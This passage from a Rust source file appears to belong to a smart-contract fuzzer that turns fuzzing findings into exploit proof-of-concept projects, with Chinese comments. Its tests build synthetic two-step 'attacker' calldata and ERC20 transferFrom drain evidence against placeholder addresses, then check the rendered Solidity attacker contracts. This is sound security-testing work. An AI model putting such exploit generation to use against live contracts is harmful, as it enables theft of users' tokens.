poc.json 的 deployments（fuzz 期部署的应答/代理合约）链上不在场，
仍逐字 etch。

```sh
export BLOCKMACHINE_RPC_URL=...
export BLOCKMACHINE_API_KEY=...    # 空 = 直接无 key 连接（免费档）
./run.sh
```

"#,
        );
    }
    if l1_only {
        s.push_str(
            r#"## L1-only 终点断言（issue #61，诚实标注）

**价值断言：形态超出 ERC20 模型，仅 L1。** payload 步的损害形态
无法落入 ERC20 transfer/transferFrom drain 模型（无臂 3 转发尾；
定罪呼出非 drain/underlying 探针形——如 LP 迁移/V3 仓位类），终点
断言降级为 L1 层（fail-soft 但有明确标注，不伪造绿灯）：

- 布置步（setup）全部真实成功 = **硬断言**（fork 直通下证明 proxy
  部署态在场、环境保真）。
- payload 步结果经 `Attacker.StepOutcome` 事件如实 emit，**不作硬
  断言**——oracle L1 语义 = 到场 + 臂判定，不依赖整笔交易成功
  （臂后 revert 是到场路径的合法收尾）。
- 臂证据受影响资产（`ASSET` = 定罪呼出目标）的受害地址余额变化经
  `AffectedAssetBalance` 事件展示，仅供参考，不作价值断言。
"#,
        );
    }
    s
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::synth::ROUTER_ADDRESS;
    use loom_fuzz_oracle::{PocCall, POC_FORMAT};

    fn word64(v: u64) -> String {
        u256_hex64(U256::from(v))
    }

    /// 多步 TRV-forward fixture poc（与 tests/l3_sequence.rs 同形）：
    /// 步0 布置（SET 分支），步1 触发 + 裸转发尾（GO 分支）。
    fn two_step_poc() -> (Poc, Vec<u8>) {
        let magic = 0xc0deu64;
        let set_magic = 0x51u64;
        let go_magic = 0x67u64;
        let sink = "0x1111111111111111111111111111111111111111";
        // 步0（布置）：SET 分支——SSTORE(0, MAGIC)。
        let mut step0 = 0xdeadbeefu32.to_be_bytes().to_vec();
        step0.extend_from_slice(&U256::from(set_magic).to_be_bytes::<32>());
        step0.extend_from_slice(&U256::from(magic).to_be_bytes::<32>());
        // 步1（payload）：GO 分支（word0）→ 守卫 → 目标帧转发：
        // to = word1（sink），input = 动态尾内容（len + "loom"）。
        let mut step1 = 0xdeadbeefu32.to_be_bytes().to_vec();
        step1.extend_from_slice(&U256::from(go_magic).to_be_bytes::<32>());
        let mut sink_word = [0u8; 32];
        sink_word[12..].copy_from_slice(&hex_bytes(sink).unwrap());
        step1.extend_from_slice(&sink_word);
        // 标准 ABI：bytes 槽在词 2，偏移值 = 0x60（指头宽后）。
        step1.extend_from_slice(&U256::from(0x60u64).to_be_bytes::<32>());
        step1.extend_from_slice(&U256::from(4u64).to_be_bytes::<32>());
        step1.extend_from_slice(b"loom");
        step1.extend_from_slice(&[0u8; 28]);
        let call_input = {
            // 定罪呼出 input = 目标帧实际转发出去的字节（尾内容 "loom"）。
            b"loom".to_vec()
        };
        let poc = Poc {
            format: POC_FORMAT.to_string(),
            digest: "0x00".into(),
            selector: "0xdeadbeef".into(),
            step: 0,
            pc: 0,
            verdict: "confirmed".into(),
            steps: vec![
                loom_fuzz_oracle::PocStep {
                    target: "0x2222222222222222222222222222222222222222".into(),
                    caller: "0x3333333333333333333333333333333333333333".into(),
                    value: word64(0),
                    calldata: format!("0x{}", hex_str(&step0)),
                },
                loom_fuzz_oracle::PocStep {
                    target: "0x2222222222222222222222222222222222222222".into(),
                    caller: "0x3333333333333333333333333333333333333333".into(),
                    value: word64(0),
                    calldata: format!("0x{}", hex_str(&step1)),
                },
            ],
            tx: None,
            prestate: Default::default(),
            responses: vec![],
            seed: 42,
            max_runs: 100,
            time_budget_secs: 300,
            evidence_value: None,
            fork: None,
            deployments: vec![loom_fuzz_oracle::PocDeployment {
                address: "0xaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa".into(),
                runtime_hex: "0x600160005260206000f3".into(),
            }],
            entry: None,
            contract: Some("0x2222222222222222222222222222222222222222".into()),
            family: loom_fuzz_oracle::HitFamily::ArbitraryCall,
            call: Some(PocCall {
                target: sink.into(),
                input: format!("0x{}", hex_str(&call_input)),
            }),
            trace_calls: Vec::new(),
            replay: String::new(),
        };
        (poc, step1)
    }

    fn hex_str(b: &[u8]) -> String {
        b.iter()
            .fold(String::with_capacity(b.len() * 2), |mut s, x| {
                let _ = write!(s, "{x:02x}");
                s
            })
    }

    /// 固长头 helper：selector + 词列（U256）。
    fn fixed_calldata(selector: u32, words: &[U256]) -> Vec<u8> {
        let mut cd = selector.to_be_bytes().to_vec();
        for w in words {
            cd.extend_from_slice(&w.to_be_bytes::<32>());
        }
        cd
    }

    fn addr_word_arr(a: [u8; 20]) -> U256 {
        let mut w = [0u8; 32];
        w[12..].copy_from_slice(&a);
        U256::from_be_bytes(w)
    }

    const SINK_ADDR: [u8; 20] = [0x11; 20];

    /// issue #61 同形 poc：步0 布置（2 词固长头），步1 payload（5 词
    /// 固长头，无动态尾），定罪呼出由调用方给（只读探针 / drain 形
    /// 两用）。TeamFinance migrate 的机械同形：payload 宽头 +
    /// 臂 1 证据。
    fn tf_shape_poc(evidence_input: Vec<u8>) -> Poc {
        let step0 = fixed_calldata(0xdeadbeef, &[U256::from(0x51u64), U256::from(0xc0deu64)]);
        let step1 = fixed_calldata(
            0xdeadbeef,
            &[
                U256::from(0x67u64),
                addr_word_arr(SINK_ADDR),
                U256::ZERO,
                U256::ZERO,
                U256::ZERO,
            ],
        );
        Poc {
            format: POC_FORMAT.to_string(),
            digest: "0x00".into(),
            selector: "0xdeadbeef".into(),
            step: 0,
            pc: 0,
            verdict: "confirmed".into(),
            steps: vec![
                loom_fuzz_oracle::PocStep {
                    target: "0x2222222222222222222222222222222222222222".into(),
                    caller: "0x3333333333333333333333333333333333333333".into(),
                    value: word64(0),
                    calldata: format!("0x{}", hex_str(&step0)),
                },
                loom_fuzz_oracle::PocStep {
                    target: "0x2222222222222222222222222222222222222222".into(),
                    caller: "0x3333333333333333333333333333333333333333".into(),
                    value: word64(0),
                    calldata: format!("0x{}", hex_str(&step1)),
                },
            ],
            tx: None,
            prestate: Default::default(),
            responses: vec![],
            seed: 42,
            max_runs: 100,
            time_budget_secs: 300,
            evidence_value: None,
            fork: None,
            deployments: vec![],
            entry: None,
            contract: Some("0x2222222222222222222222222222222222222222".into()),
            family: loom_fuzz_oracle::HitFamily::ArbitraryCall,
            call: Some(PocCall {
                target: loom_fuzz_oracle::bytes_hex(&SINK_ADDR),
                input: format!("0x{}", hex_str(&evidence_input)),
            }),
            trace_calls: Vec::new(),
            replay: String::new(),
        }
    }

    /// 只读探针形定罪呼出：balanceOf(address)（TeamFinance migrate
    /// 证据的机械同形）——非 drain/underlying 探针，payload 无转发尾。
    fn balance_of_probe() -> Vec<u8> {
        let mut input = 0x70a08231u32.to_be_bytes().to_vec();
        input.extend_from_slice(&U256::from(0x22u64).to_be_bytes::<32>());
        input
    }

    #[test]
    fn l3_fork_l1_only_beyond_erc20_value_shape() {
        // issue #61：fork 直通 + 价值形态超出 ERC20 drain 模型 →
        // L1Only（payload verbatim + 仅 L1 断言 + 诚实标注）。
        let poc = tf_shape_poc(balance_of_probe());
        let steps = poc.normalized_steps().unwrap();
        let call = poc.call.as_ref().unwrap();
        let etw = addr_word_arr(SINK_ADDR);
        let evidence_input = hex_bytes(&call.input).unwrap();
        let calldata = hex_bytes(&steps[1].calldata).unwrap();
        let shape = parse_head_shape(&calldata).unwrap();
        // 价值模型 applicability：balanceOf 探针不落入任何锚点。
        assert!(!is_erc20_drain_call(&evidence_input));
        assert!(
            matches!(
                plan_payload(&shape, etw, &evidence_input, &calldata, true),
                Ok(PayloadMode::L1Only)
            ),
            "fork 直通下应 L1Only fail-soft"
        );
        // Genesis 态同形：BadShape 如实降级（无链上环境可直通）。
        let err = plan_payload(&shape, etw, &evidence_input, &calldata, false).unwrap_err();
        assert!(
            format!("{err}").contains("超出 ERC20 drain 模型"),
            "Genesis 应 BadShape: {err}"
        );

        // 渲染层：fork 直通不 etch 分析对象；L1Only 无 mock、payload
        // verbatim、仅 L1 断言 + 局限标注。
        let body = l3_test_sol(
            &[],
            "6000",
            &ExploitParams::default(),
            &[],
            ROUTER_ADDRESS,
            VictimModel::Single,
            U256::ZERO,
            true, // fork
            true, // l1_only
            SINK_ADDR,
        );
        assert!(!body.contains("vm.etch(ROUTER"), "fork 直通不 etch: {body}");
        assert!(
            body.contains("形态超出 ERC20 模型，仅 L1"),
            "局限如实标注: {body}"
        );
        assert!(
            body.contains("AffectedAssetBalance"),
            "受影响资产余额变化证据事件: {body}"
        );
        assert!(!body.contains("new MockERC20"), "L1Only 无受害资产 mock");
        assert!(
            body.contains("import {IERC20} from \"../src/IERC20.sol\";"),
            "L1Only 余额证据需 IERC20: {body}"
        );
        assert!(
            body.contains(&format!(
                "address constant ASSET = {}",
                addr_expr(SINK_ADDR)
            )),
            "ASSET = 臂证据受影响资产: {body}"
        );
        // payload verbatim：witness 原词重编码，无 ERC20 注入。
        let attacker = attacker_sol(
            &[
                render_setup_step(0, &shape, &calldata, [0x22; 20], U256::ZERO).unwrap(),
                {
                    let mut r =
                        render_setup_step(1, &shape, &calldata, [0x22; 20], U256::ZERO).unwrap();
                    r.soft = true;
                    r
                },
            ],
            &ExploitParams::default(),
            &[],
        );
        assert!(attacker.contains("StepOutcome"), "payload 结果如实 emit");
        assert!(
            !attacker.contains("require(ok1"),
            "L1Only payload 不作硬断言: {attacker}"
        );
        assert!(
            attacker.contains("require(ok0"),
            "布置步仍硬断言（真实环境布置必须成功）: {attacker}"
        );
        assert!(
            !attacker.contains("address(asset)"),
            "payload verbatim 无槽替换注入: {attacker}"
        );
    }

    #[test]
    fn l3_fork_drain_shape_keeps_injection_without_etch() {
        // issue #61 回归锚：价值模型在场（定罪呼出 = transferFrom
        // drain 形）时 fork 直通仍走 Drain 注入——只是不 etch 分析对象。
        let sel = {
            use sha3::{Digest, Keccak256};
            let mut h = Keccak256::new();
            h.update(b"transferFrom(address,address,uint256)");
            u32::from_be_bytes(h.finalize()[..4].try_into().unwrap())
        };
        let drain_evidence = fixed_calldata(
            sel,
            &[
                addr_word_arr([0x22; 20]),
                addr_word_arr([0xbe; 20]),
                U256::from(100u64),
            ],
        );
        assert!(is_erc20_drain_call(&drain_evidence));
        let poc = tf_shape_poc(drain_evidence);
        let steps = poc.normalized_steps().unwrap();
        let calldata = hex_bytes(&steps[1].calldata).unwrap();
        let shape = parse_head_shape(&calldata).unwrap();
        let evidence_input = hex_bytes(&poc.call.as_ref().unwrap().input).unwrap();
        let mode = plan_payload(
            &shape,
            addr_word_arr(SINK_ADDR),
            &evidence_input,
            &calldata,
            true,
        )
        .unwrap();
        let plan = match mode {
            PayloadMode::Drain(plan) => plan,
            PayloadMode::L1Only => panic!("drain 形证据应走 Drain 注入"),
        };
        assert_eq!(plan.target_slot, 1);
        let r = render_payload_step(&shape, &plan, [0x22; 20], U256::ZERO);
        assert!(
            r.data_expr.contains("address(asset)"),
            "槽替换保留: {}",
            r.data_expr
        );
        // fork 直通：Drain 工程同样不 etch 分析对象。
        let body = l3_test_sol(
            &[],
            "6000",
            &ExploitParams::default(),
            &[],
            ROUTER_ADDRESS,
            plan.model,
            U256::ZERO,
            true,  // fork
            false, // l1_only
            SINK_ADDR,
        );
        assert!(!body.contains("vm.etch(ROUTER"), "fork 直通不 etch: {body}");
        assert!(
            body.contains("token.balanceOf(ROUTER) == 0"),
            "Drain 终点断言保留: {body}"
        );
    }

    #[test]
    fn l3_renders_attacker_and_per_step_parsing() {
        let (poc, _step1) = two_step_poc();
        let steps = poc.normalized_steps().unwrap();
        let out = std::env::temp_dir().join(format!("loom-l3-render-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&out);
        // 渲染层验证（不跑 forge——forge 绿灯见 tests/l3_sequence.rs）。
        let call = poc.call.as_ref().unwrap();
        let evidence_target = hex_bytes(&call.target).unwrap();
        let mut tw = [0u8; 32];
        tw[12..].copy_from_slice(&evidence_target);
        let etw = U256::from_be_bytes(tw);
        let evidence_input = hex_bytes(&call.input).unwrap();
        let last = steps.len() - 1;
        for (i, s) in steps.iter().enumerate() {
            let calldata = hex_bytes(&s.calldata).unwrap();
            let shape = parse_head_shape(&calldata).unwrap();
            if i == last {
                let plan = analyze_payload(&shape, etw, &evidence_input, &calldata).unwrap();
                let r = render_payload_step(&shape, &plan, [0x22; 20], U256::ZERO);
                assert!(r.data_expr.contains("address(asset)"));
                assert!(r.data_expr.contains("request"));
                assert!(r.decls.contains("transferFrom"));
            } else {
                let r = render_setup_step(i, &shape, &calldata, [0x22; 20], U256::ZERO).unwrap();
                assert!(r.data_expr.contains("abi.encodeWithSelector(0xdeadbeef"));
                assert!(r.data_expr.contains("uint256(0x"));
                assert!(!r.data_expr.contains("address(token)"), "布置步无注入");
            }
        }
        let _ = out;
    }

    #[test]
    fn l3_payload_bad_shape_degrades_honestly() {
        // 头形与定罪目标无交叉（payload 头词无 sink）→ BadShape。
        let (poc, _) = two_step_poc();
        let mut bad = poc;
        bad.call = Some(PocCall {
            target: "0x9999999999999999999999999999999999999999".into(),
            input: bad.call.as_ref().unwrap().input.clone(),
        });
        let steps = bad.normalized_steps().unwrap();
        let err = generate_l3(
            &bad,
            &steps,
            "6000",
            std::path::Path::new("/tmp/loom-l3-unused"),
            false,
            &[],
            ROUTER_ADDRESS,
            &ExploitParams::default(),
        )
        .unwrap_err();
        assert!(
            matches!(err, PocgenError::BadShape(_)),
            "应 BadShape 诚实降级: {err}"
        );
    }
}
